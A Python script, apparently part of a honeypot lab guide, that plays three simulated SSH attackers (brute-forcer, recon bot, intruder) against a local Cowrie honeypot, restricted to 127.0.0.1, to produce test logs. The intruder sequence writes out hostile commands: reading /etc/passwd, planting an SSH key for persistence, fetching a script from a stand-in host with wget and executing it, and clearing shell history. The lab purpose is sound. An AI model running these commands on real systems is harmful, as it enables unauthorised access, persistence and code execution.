"""
Play the attacker against YOUR OWN local honeypot, to generate test logs.

Only ever point this at 127.0.0.1 (your laptop). It reproduces the three
behaviours you will see from real attackers:
  1. brute-forcer: failed password guesses, nothing else
  2. recon bot:    logs in, runs one chained command, leaves
  3. intruder:     interactive shell, persistence, download attempt, clean-up

Usage:
    pip install paramiko
    python simulate_attacker.py            # SSH on 127.0.0.1:2222
"""
import argparse
import time

import paramiko

ALLOWED_HOSTS = {"127.0.0.1", "localhost"}


def attempt(host, port, user, password, exec_cmd=None, shell_lines=None):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port, username=user, password=password, timeout=10,
                       allow_agent=False, look_for_keys=False)
    except paramiko.AuthenticationException:
        print(f"  failed  {user}/{password}")
        return
    print(f"  success {user}/{password}")
    if exec_cmd:
        try:  # Cowrie closes the channel straight after one exec, like real bots expect
            _, out, _ = client.exec_command(exec_cmd)
            out.read()
        except paramiko.SSHException:
            pass
    if shell_lines:
        chan = client.invoke_shell()
        time.sleep(1)
        for line in shell_lines:
            chan.send(line + "\n")
            time.sleep(0.7)
        chan.send("exit\n")
        time.sleep(0.5)
    client.close()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=2222)
    args = ap.parse_args()
    if args.host not in ALLOWED_HOSTS:
        raise SystemExit("Refusing to run: this script is only for your local lab (127.0.0.1).")

    print("1) Brute-forcer")
    for pw in ["root", "123456"]:          # Cowrie's default userdb rejects these two
        attempt(args.host, args.port, "root", pw)

    print("2) Recon bot")
    attempt(args.host, args.port, "root", "admin123",
            exec_cmd="uname -a; cat /proc/cpuinfo | grep name | wc -l; nproc")

    print("3) Intruder")
    attempt(args.host, args.port, "root", "P@ssw0rd", shell_lines=[
        "whoami",
        "cat /etc/passwd",
        "free -m",
        "cd ~; mkdir -p .ssh; echo 'ssh-rsa AAAAB3NzaTEST lab-test' >> .ssh/authorized_keys",
        "wget http://203.0.113.10/x86.sh -O /tmp/x.sh",   # 203.0.113.0/24 is a reserved test range
        "chmod +x /tmp/x.sh; /tmp/x.sh",
        "crontab -l",
        "history -c",
    ])
    print("Done. Now copy the log out of the container (see the lab guide).")


if __name__ == "__main__":
    main()
